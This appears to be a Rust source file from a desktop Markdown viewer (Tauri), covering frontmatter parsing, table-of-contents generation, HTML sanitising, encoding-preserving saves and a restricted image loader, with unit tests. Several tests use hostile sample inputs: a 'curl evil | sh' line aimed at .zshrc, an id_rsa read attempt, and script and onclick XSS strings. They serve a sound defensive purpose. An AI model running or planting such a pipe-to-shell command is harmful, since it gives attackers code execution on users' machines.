use ammonia::Builder as AmmoniaBuilder;
use base64::{engine::general_purpose, Engine as _};
use pulldown_cmark::{html, CowStr, Event, Options, Parser, Tag, TagEnd};
use serde::Serialize;
use std::fs;

#[derive(Debug, Serialize)]
pub struct TocItem {
    pub level: u32,
    pub text: String,
    pub anchor: String,
}

#[derive(Debug, Serialize)]
pub struct MarkdownResult {
    pub html: String,
    pub toc: Vec<TocItem>,
    pub frontmatter: Option<serde_json::Value>,
    pub raw: String,
    /// 元ファイルの文字コード。保存時はこの文字コードに戻して書き込む
    pub encoding: String,
}

pub(crate) fn slugify(text: &str) -> String {
    text.to_lowercase()
        .chars()
        .filter_map(|c| match c {
            'a'..='z' | '0'..='9' | '-' | '_' => Some(c),
            ' ' => Some('-'),
            c if (c as u32) > 127 => Some(c), // CJK等の非ASCII文字を保持
            _ => None,
        })
        .collect()
}

pub(crate) fn parse_frontmatter(input: &str) -> (Option<serde_json::Value>, &str) {
    // "---\n" または "---\r\n" で始まる場合のみfrontmatterとみなす
    let body = match input
        .strip_prefix("---\n")
        .or_else(|| input.strip_prefix("---\r\n"))
    {
        Some(b) => b,
        None => return (None, input),
    };

    // 閉じ "---" を探す（行頭の \n--- パターン）
    let close_pos = match body.find("\n---") {
        Some(p) => p,
        None => return (None, input),
    };

    let yaml_str = &body[..close_pos];

    // "\n---" の後ろを取得（"\n" or "\r\n" をスキップ）
    let rest_start = close_pos + 4; // "\n---".len() == 4
    let after_marker = if rest_start <= body.len() {
        &body[rest_start..]
    } else {
        ""
    };
    let markdown_content = after_marker
        .strip_prefix('\n')
        .or_else(|| after_marker.strip_prefix("\r\n"))
        .unwrap_or(after_marker);

    match serde_yaml::from_str::<serde_json::Value>(yaml_str) {
        Ok(val) => (Some(val), markdown_content),
        Err(_) => (None, input),
    }
}

pub(crate) fn render_markdown(content: &str) -> (String, Vec<TocItem>) {
    let mut opts = Options::empty();
    opts.insert(Options::ENABLE_TABLES);
    opts.insert(Options::ENABLE_TASKLISTS);
    opts.insert(Options::ENABLE_FOOTNOTES);
    opts.insert(Options::ENABLE_STRIKETHROUGH);

    // 第1パス: イベントを収集してToC構築
    let raw_events: Vec<Event> = Parser::new_ext(content, opts).collect();

    let mut toc: Vec<TocItem> = Vec::new();
    let mut in_heading: Option<u32> = None;
    let mut heading_text = String::new();
    let mut anchor_counts: std::collections::HashMap<String, usize> = std::collections::HashMap::new();

    for event in &raw_events {
        match event {
            Event::Start(Tag::Heading { level, .. }) => {
                in_heading = Some(*level as u32);
                heading_text.clear();
            }
            Event::Text(t) if in_heading.is_some() => {
                heading_text.push_str(t);
            }
            Event::Code(t) if in_heading.is_some() => {
                heading_text.push_str(t);
            }
            Event::End(TagEnd::Heading(_)) => {
                if let Some(level) = in_heading.take() {
                    let base = slugify(&heading_text);
                    let entry = anchor_counts.entry(base.clone()).or_insert(0);
                    let anchor = if *entry == 0 {
                        base
                    } else {
                        format!("{}-{}", base, entry)
                    };
                    *entry += 1;
                    toc.push(TocItem { level, text: heading_text.clone(), anchor });
                    heading_text.clear();
                }
            }
            _ => {}
        }
    }

    // 第2パス: 見出しにid属性を注入してHTMLレンダリング
    let mut toc_idx = 0usize;
    let events_with_ids: Vec<Event> = raw_events
        .into_iter()
        .map(|event| match event {
            Event::Start(Tag::Heading { level, id: _, classes, attrs }) => {
                let anchor = toc.get(toc_idx).map(|t| {
                    toc_idx += 1;
                    CowStr::Boxed(t.anchor.clone().into_boxed_str())
                });
                Event::Start(Tag::Heading { level, id: anchor, classes, attrs })
            }
            other => other,
        })
        .collect();

    let mut html_output = String::new();
    html::push_html(&mut html_output, events_with_ids.into_iter());

    let sanitized = sanitize_markdown_html(&html_output);
    (sanitized, toc)
}

fn sanitize_markdown_html(html: &str) -> String {
    let mut b = AmmoniaBuilder::default();
    // task list チェックボックス・Mermaid 用 div を許可
    b.add_tags(["input", "div"]);
    b.add_tag_attributes("input", ["type", "disabled", "checked"]);
    // 見出し id 属性 (ToC アンカー)
    for tag in &["h1", "h2", "h3", "h4", "h5", "h6"] {
        b.add_tag_attributes(tag, ["id"]);
    }
    // コードブロック言語クラス (Shiki 用)
    b.add_tag_attributes("code", ["class"]);
    b.add_tag_attributes("pre", ["class"]);
    // リンク・画像
    b.add_tag_attributes("a", ["href", "title", "id", "name"]);
    b.add_tag_attributes("img", ["src", "alt", "title", "width", "height"]);
    b.clean(html).to_string()
}

const MAX_MARKDOWN_SIZE: u64 = 50 * 1024 * 1024; // 50 MB
const MARKDOWN_EXTENSIONS: &[&str] = &["md", "markdown"];

/// UTF-8 ならそのまま (BOM も保つ)、それ以外は文字コードを推定してデコードする。
fn decode_markdown(bytes: Vec<u8>) -> (String, String) {
    match String::from_utf8(bytes) {
        Ok(text) => (text, "UTF-8".to_string()),
        Err(e) => crate::csv_commands::decode_file(e.as_bytes()),
    }
}

/// 読み込んだときの文字コードに戻す。表せない文字がある場合は書き込まずにエラーにする。
fn encode_markdown(content: &str, encoding: Option<&str>) -> Result<Vec<u8>, String> {
    let enc = match encoding.and_then(|label| encoding_rs::Encoding::for_label(label.as_bytes())) {
        Some(enc) if enc != encoding_rs::UTF_8 => enc,
        _ => return Ok(content.as_bytes().to_vec()),
    };
    let (bytes, _, had_errors) = enc.encode(content);
    if had_errors {
        return Err(format!(
            "{} で表せない文字が含まれているため保存できません",
            enc.name()
        ));
    }
    Ok(bytes.into_owned())
}

#[tauri::command(async)]
pub fn read_markdown(path: String) -> Result<MarkdownResult, String> {
    crate::utils::catch_panic(move || {
        crate::utils::require_extension(std::path::Path::new(&path), MARKDOWN_EXTENSIONS)?;
        let size = crate::utils::assert_regular_file(std::path::Path::new(&path))?;
        if size > MAX_MARKDOWN_SIZE {
            return Err(format!("Markdown file too large: {} bytes (max 50 MB)", size));
        }
        let (raw, encoding) = decode_markdown(fs::read(&path).map_err(|e| e.to_string())?);
        let (frontmatter, content) = parse_frontmatter(&raw);
        let (html, toc) = render_markdown(content);
        Ok(MarkdownResult { html, toc, frontmatter, raw, encoding })
    })
}

#[tauri::command(async)]
pub fn save_markdown(path: String, content: String, encoding: Option<String>) -> Result<(), String> {
    // 開いている既存の Markdown ファイルの上書きだけを許す (~/.zshrc などへの書き込みを防ぐ)
    let p = std::path::Path::new(&path);
    crate::utils::require_extension(p, MARKDOWN_EXTENSIONS)?;
    crate::utils::assert_regular_file(p)?;
    let bytes = encode_markdown(&content, encoding.as_deref())?;
    crate::utils::atomic_write(std::path::Path::new(&path), &bytes).map_err(|e| e.to_string())
}

const MAX_IMAGE_SIZE: u64 = 20 * 1024 * 1024; // 20 MB

/// 先頭バイト (SVG は拡張子と内容) から画像の MIME タイプを判定する。画像以外は None。
fn image_mime(path: &std::path::Path, bytes: &[u8]) -> Option<&'static str> {
    if bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
        return Some("image/png");
    }
    if bytes.starts_with(&[0xFF, 0xD8, 0xFF]) {
        return Some("image/jpeg");
    }
    if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
        return Some("image/gif");
    }
    if bytes.len() >= 12 && &bytes[..4] == b"RIFF" && &bytes[8..12] == b"WEBP" {
        return Some("image/webp");
    }
    if bytes.starts_with(b"BM") {
        return Some("image/bmp");
    }
    let is_svg = path
        .extension()
        .is_some_and(|e| e.eq_ignore_ascii_case("svg"))
        && String::from_utf8_lossy(&bytes[..bytes.len().min(4096)]).contains("<svg");
    is_svg.then_some("image/svg+xml")
}

/// Markdown から参照されるローカル画像を data URL で返す。
/// asset プロトコルを有効にすると webview から任意ファイルを読めてしまうため、
/// 画像と判定できたファイルだけを返す。
#[tauri::command(async)]
pub fn read_local_image(path: String) -> Result<String, String> {
    let p = std::path::Path::new(&path);
    let size = crate::utils::assert_regular_file(p)?;
    if size > MAX_IMAGE_SIZE {
        return Err(format!("image too large: {} bytes (max 20 MB)", size));
    }
    let bytes = fs::read(p).map_err(|e| e.to_string())?;
    let mime = image_mime(p, &bytes).ok_or_else(|| format!("not an image: {}", path))?;
    Ok(format!("data:{};base64,{}", mime, general_purpose::STANDARD.encode(&bytes)))
}

#[tauri::command(async)]
pub fn render_markdown_string(content: String) -> Result<MarkdownResult, String> {
    crate::utils::catch_panic(move || {
        let (frontmatter, body) = parse_frontmatter(&content);
        let (html, toc) = render_markdown(body);
        Ok(MarkdownResult { html, toc, frontmatter, raw: content, encoding: "UTF-8".to_string() })
    })
}

#[cfg(test)]
mod tests {
    #[test]
    fn shift_jis_markdown_is_readable_and_saved_back_in_shift_jis() {
        let path = std::env::temp_dir().join(format!("qv_sjis_{}.md", std::process::id()));
        let (original, _, _) = encoding_rs::SHIFT_JIS.encode("# 見出し\n\n本文です。日本語の文章をここに書きます。\n");
        std::fs::write(&path, &original).unwrap();
        let p = path.to_string_lossy().into_owned();

        let read = read_markdown(p.clone()).unwrap();
        assert!(read.raw.contains("本文です"));
        assert_eq!(read.encoding, "Shift_JIS");

        save_markdown(p.clone(), read.raw.clone(), Some(read.encoding.clone())).unwrap();
        assert_eq!(std::fs::read(&path).unwrap(), original.into_owned());

        let unrepresentable = save_markdown(p, "絵文字 😀".into(), Some(read.encoding));
        std::fs::remove_file(&path).ok();
        assert!(unrepresentable.is_err());
    }

    #[test]
    fn markdown_commands_only_touch_existing_markdown_files() {
        let dir = std::env::temp_dir().join(format!("qv_mdguard_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let secret = dir.join("id_rsa");
        std::fs::write(&secret, "PRIVATE KEY").unwrap();
        let p = |name: &str| dir.join(name).to_string_lossy().into_owned();

        let read_secret = read_markdown(p("id_rsa"));
        let write_rc = save_markdown(p(".zshrc"), "curl evil | sh".into(), None);
        let create_md = save_markdown(p("new.md"), "x".into(), None);
        let rc_exists = dir.join(".zshrc").exists() || dir.join("new.md").exists();
        std::fs::remove_dir_all(&dir).ok();

        assert!(read_secret.is_err());
        assert!(write_rc.is_err());
        assert!(create_md.is_err());
        assert!(!rc_exists);
    }

    #[test]
    fn utf8_bom_is_kept_and_non_regular_files_are_rejected() {
        let path = std::env::temp_dir().join(format!("qv_bom_{}.md", std::process::id()));
        std::fs::write(&path, "\u{FEFF}# Title\n").unwrap();
        let read = read_markdown(path.to_string_lossy().into_owned()).unwrap();
        std::fs::remove_file(&path).ok();
        assert!(read.raw.starts_with('\u{FEFF}'));
        assert_eq!(read.encoding, "UTF-8");
        assert!(read_markdown(std::env::temp_dir().to_string_lossy().into_owned()).is_err());
    }

    #[test]
    fn read_local_image_returns_data_url_only_for_images() {
        let dir = std::env::temp_dir();
        let png = dir.join(format!("qv_img_{}.png", std::process::id()));
        let txt = dir.join(format!("qv_img_{}.md", std::process::id()));
        std::fs::write(&png, b"\x89PNG\r\n\x1a\nrest").unwrap();
        std::fs::write(&txt, b"secret token").unwrap();
        let ok = read_local_image(png.to_string_lossy().into_owned());
        let rejected = read_local_image(txt.to_string_lossy().into_owned());
        std::fs::remove_file(&png).ok();
        std::fs::remove_file(&txt).ok();
        assert!(ok.unwrap().starts_with("data:image/png;base64,"));
        assert!(rejected.is_err());
    }

    #[test]
    fn image_mime_detects_svg_by_extension_and_content() {
        let svg = std::path::Path::new("a.svg");
        assert_eq!(image_mime(svg, b"<?xml version=\"1.0\"?><svg xmlns=\"x\"/>"), Some("image/svg+xml"));
        assert_eq!(image_mime(svg, b"not svg"), None);
        assert_eq!(image_mime(std::path::Path::new("a.txt"), b"<svg/>"), None);
    }

    use super::*;

    #[test]
    fn test_slugify_basic() {
        assert_eq!(slugify("Hello World"), "hello-world");
    }

    #[test]
    fn test_slugify_special_chars() {
        assert_eq!(slugify("Hello, World!"), "hello-world");
    }

    #[test]
    fn test_slugify_already_slug() {
        assert_eq!(slugify("hello-world"), "hello-world");
    }

    #[test]
    fn test_slugify_numbers() {
        assert_eq!(slugify("Section 1.2 Overview"), "section-12-overview");
    }

    #[test]
    fn test_slugify_cjk() {
        assert_eq!(slugify("日本語見出し"), "日本語見出し");
    }

    #[test]
    fn test_parse_frontmatter_none() {
        let (fm, content) = parse_frontmatter("# Hello\n\nBody text.");
        assert!(fm.is_none());
        assert_eq!(content, "# Hello\n\nBody text.");
    }

    #[test]
    fn test_parse_frontmatter_basic() {
        let md = "---\ntitle: Test\nauthor: Alice\n---\n# Hello\n\nBody.";
        let (fm, content) = parse_frontmatter(md);
        let fm = fm.expect("frontmatter should be Some");
        assert_eq!(fm["title"], serde_json::json!("Test"));
        assert_eq!(fm["author"], serde_json::json!("Alice"));
        assert_eq!(content, "# Hello\n\nBody.");
    }

    #[test]
    fn test_parse_frontmatter_invalid_yaml() {
        let md = "---\nkey: [unclosed bracket\n---\n# Hello";
        let (fm, content) = parse_frontmatter(md);
        assert!(fm.is_none());
        assert_eq!(content, "---\nkey: [unclosed bracket\n---\n# Hello");
    }

    #[test]
    fn test_parse_frontmatter_no_closing() {
        let md = "---\ntitle: Test\n# Hello";
        let (fm, content) = parse_frontmatter(md);
        assert!(fm.is_none());
        assert_eq!(content, "---\ntitle: Test\n# Hello");
    }

    #[test]
    fn test_render_markdown_basic() {
        let (html, toc) = render_markdown("# Hello\n\nWorld.");
        assert!(html.contains("<h1"));
        assert!(html.contains("Hello"));
        assert!(html.contains("<p>World.</p>"));
        assert_eq!(toc.len(), 1);
        assert_eq!(toc[0].level, 1);
        assert_eq!(toc[0].text, "Hello");
        assert_eq!(toc[0].anchor, "hello");
    }

    #[test]
    fn test_render_markdown_heading_id_in_html() {
        let (html, toc) = render_markdown("## My Section");
        assert_eq!(toc[0].anchor, "my-section");
        assert!(html.contains("id=\"my-section\""));
    }

    #[test]
    fn test_render_markdown_gfm_table() {
        let md = "| A | B |\n|---|---|\n| 1 | 2 |";
        let (html, _) = render_markdown(md);
        assert!(html.contains("<table>"));
    }

    #[test]
    fn test_render_markdown_gfm_strikethrough() {
        let (html, _) = render_markdown("~~deleted~~");
        assert!(html.contains("<del>deleted</del>"));
    }

    #[test]
    fn test_render_markdown_gfm_tasklist() {
        let md = "- [x] Done\n- [ ] Pending";
        let (html, _) = render_markdown(md);
        assert!(html.contains("checkbox"));
        assert!(html.contains("checked"));
    }

    #[test]
    fn test_render_markdown_toc_multiple_headings() {
        let md = "# H1\n## H2\n### H3\n## H2 Again";
        let (_, toc) = render_markdown(md);
        assert_eq!(toc.len(), 4);
        assert_eq!(toc[0].level, 1);
        assert_eq!(toc[1].level, 2);
        assert_eq!(toc[2].level, 3);
        assert_eq!(toc[3].level, 2);
        assert_eq!(toc[3].anchor, "h2-again");
    }

    #[test]
    fn test_render_markdown_duplicate_anchors() {
        let md = "## Introduction\n## Introduction\n## Introduction";
        let (html, toc) = render_markdown(md);
        assert_eq!(toc[0].anchor, "introduction");
        assert_eq!(toc[1].anchor, "introduction-1");
        assert_eq!(toc[2].anchor, "introduction-2");
        assert!(html.contains("id=\"introduction\""));
        assert!(html.contains("id=\"introduction-1\""));
        assert!(html.contains("id=\"introduction-2\""));
    }

    #[test]
    fn test_render_markdown_heading_with_code() {
        let (_, toc) = render_markdown("# Hello `world`");
        assert_eq!(toc[0].text, "Hello world");
        assert_eq!(toc[0].anchor, "hello-world");
    }

    #[test]
    fn sanitize_strips_script_tags() {
        let html = "<p>hello</p><script>alert(1)</script>";
        let out = sanitize_markdown_html(html);
        assert!(!out.contains("<script>"), "script tag should be removed");
        assert!(out.contains("hello"));
    }

    #[test]
    fn sanitize_strips_event_handlers() {
        let html = "<p onclick=\"alert(1)\">click</p>";
        let out = sanitize_markdown_html(html);
        assert!(!out.contains("onclick"), "onclick should be removed");
        assert!(out.contains("click"));
    }

    #[test]
    fn sanitize_preserves_heading_id() {
        let html = "<h1 id=\"introduction\">Introduction</h1>";
        let out = sanitize_markdown_html(html);
        assert!(out.contains("id=\"introduction\""), "heading id should be preserved");
    }

    #[test]
    fn sanitize_preserves_code_class() {
        let html = "<pre><code class=\"language-rust\">fn main() {}</code></pre>";
        let out = sanitize_markdown_html(html);
        assert!(out.contains("class=\"language-rust\""), "code class should be preserved");
    }

    #[test]
    fn test_read_markdown_nonexistent() {
        let result = read_markdown("/nonexistent/path/file.md".to_string());
        assert!(result.is_err());
    }

    #[test]
    fn test_save_and_read_markdown_roundtrip() {
        let path = std::env::temp_dir().join("quickview_test_markdown.md");
        let path_str = path.to_string_lossy().to_string();
        let content = "---\ntitle: Test\nauthor: Alice\n---\n# Hello\n\nBody text.";

        std::fs::write(&path, "").unwrap();
        save_markdown(path_str.clone(), content.to_string(), None).unwrap();
        let result = read_markdown(path_str).unwrap();

        assert_eq!(result.raw, content);
        assert!(result.html.contains("<h1"));
        assert_eq!(result.toc.len(), 1);
        assert_eq!(result.toc[0].text, "Hello");
        let fm = result.frontmatter.unwrap();
        assert_eq!(fm["title"], serde_json::json!("Test"));
        assert_eq!(fm["author"], serde_json::json!("Alice"));

        fs::remove_file(path).ok();
    }
}
